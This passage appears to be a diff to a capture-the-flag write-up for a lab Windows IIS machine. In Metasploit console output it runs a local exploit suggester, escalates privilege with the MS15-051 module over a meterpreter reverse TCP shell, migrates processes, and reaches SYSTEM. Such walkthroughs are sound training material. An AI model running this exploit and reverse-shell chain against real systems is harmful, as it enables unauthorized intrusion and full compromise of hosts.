@@ -224,3 +224,127 @@ msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > run
 
 meterpreter >
 ```
+
+- on running `local_exploit_suggester` found following
+```bash
+msf6 post(multi/recon/local_exploit_suggester) > run
+
+[*] 10.10.10.15 - Collecting local exploits for x86/windows...
+[*] 10.10.10.15 - 37 exploit checks are being tried...
+[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
+[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
+[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
+[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
+[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
+[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
+[*] Post module execution completed
+
+```
+
+- trying suggested `vulnerable` exploit(s)
+
+```bash
+msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms15_051_client_copy_image
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/local/ms15_051_client_copy_image) > show options
+
+Module options (exploit/windows/local/ms15_051_client_copy_image):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SESSION                   yes       The session to run this module on.
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.37.128   yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows x86
+
+
+msf6 exploit(windows/local/ms15_051_client_copy_image) > set session 1
+session => 1
+```
+
+- migrate to `NT_Authority Process`
+```bash
+msf6 exploit(windows/local/ms15_051_client_copy_image) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name               Arch  Session  User                          Path
+ ---   ----  ----               ----  -------  ----                          ----
+ 0     0     [System Process]                                                
+ 4     0     System                                                          
+ 272   4     smss.exe                                                        
+ 324   272   csrss.exe                                                       
+ 348   272   winlogon.exe                                                    
+ 396   348   services.exe                                                    
+ 408   348   lsass.exe                                                       
+ 612   396   svchost.exe                                                     
+ 680   1088  cidaemon.exe                                                    
+ 684   396   svchost.exe                                                     
+ 740   396   svchost.exe                                                     
+ 768   396   svchost.exe                                                     
+ 804   396   svchost.exe                                                     
+ 828   1088  cidaemon.exe                                                    
+ 940   396   spoolsv.exe                                                     
+ 968   396   msdtc.exe                                                       
+ 1088  396   cisvc.exe                                                       
+ 1136  396   svchost.exe                                                     
+ 1184  396   inetinfo.exe                                                    
+ 1220  396   svchost.exe                                                     
+ 1264  1088  cidaemon.exe                                                    
+ 1332  396   VGAuthService.exe                                               
+ 1412  396   vmtoolsd.exe                                                    
+ 1460  396   svchost.exe                                                     
+ 1632  396   alg.exe                                                         
+ 1664  396   svchost.exe                                                     
+ 1776  612   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
+ 1912  396   dllhost.exe                                                     
+ 2308  612   wmiprvse.exe                                                    
+ 2620  348   logon.scr                                                       
+ 2744  1460  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
+ 2816  612   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
+ 2864  2744  rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe
+ 3440  2864  cmd.exe            x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\cmd.exe
+
+meterpreter > migrate 2816
+[*] Migrating from 2864 to 2816...
+[*] Migration completed successfully
+```
+- then run the exploit
+
+```bash
+msf6 exploit(windows/local/ms15_051_client_copy_image) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.7:5555 
+[*] Launching notepad to host the exploit...
+[+] Process 3252 launched.
+[*] Reflectively injecting the exploit DLL into 3252...
+[*] Injecting exploit into 3252...
+[*] Exploit injected. Injecting payload into 3252...
+[*] Payload injected. Executing exploit...
+[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
+[*] Sending stage (175174 bytes) to 10.10.10.15
+[*] Meterpreter session 2 opened (10.10.14.7:5555 -> 10.10.10.15:1032) at 2021-08-28 08:29:42 -0400
+
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+
+```
+
